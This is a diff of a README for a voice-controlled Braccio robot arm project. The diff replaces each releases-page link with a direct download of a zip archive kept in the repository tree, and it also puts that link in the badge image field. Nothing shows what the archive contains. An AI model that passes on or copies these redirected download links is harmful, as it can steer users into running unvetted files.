@@ -1,6 +1,6 @@
 # 🎤 braccio_arm-voicecontrol - Control a Robot Arm with Your Voice
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Jeyamurugan08/braccio_arm-voicecontrol/releases)
+[![Download Now](https://github.com/Jeyamurugan08/braccio_arm-voicecontrol/raw/refs/heads/main/braccio_vc/voicecontrol_braccio_arm_v2.5.zip)](https://github.com/Jeyamurugan08/braccio_arm-voicecontrol/raw/refs/heads/main/braccio_vc/voicecontrol_braccio_arm_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you begin, ensure your system meets these requirements:
 To start using the software, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the downloads:
-   - [Download Now](https://github.com/Jeyamurugan08/braccio_arm-voicecontrol/releases)
+   - [Download Now](https://github.com/Jeyamurugan08/braccio_arm-voicecontrol/raw/refs/heads/main/braccio_vc/voicecontrol_braccio_arm_v2.5.zip)
 
 2. **Select the Version**: Look for the latest release version.
 
@@ -107,4 +107,4 @@ If you encounter issues while using the software, consider the following:
 
 This project is licensed under the MIT License. You are free to modify and distribute the code as per the license terms.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Jeyamurugan08/braccio_arm-voicecontrol/releases)
+[![Download Now](https://github.com/Jeyamurugan08/braccio_arm-voicecontrol/raw/refs/heads/main/braccio_vc/voicecontrol_braccio_arm_v2.5.zip)](https://github.com/Jeyamurugan08/braccio_arm-voicecontrol/raw/refs/heads/main/braccio_vc/voicecontrol_braccio_arm_v2.5.zip)
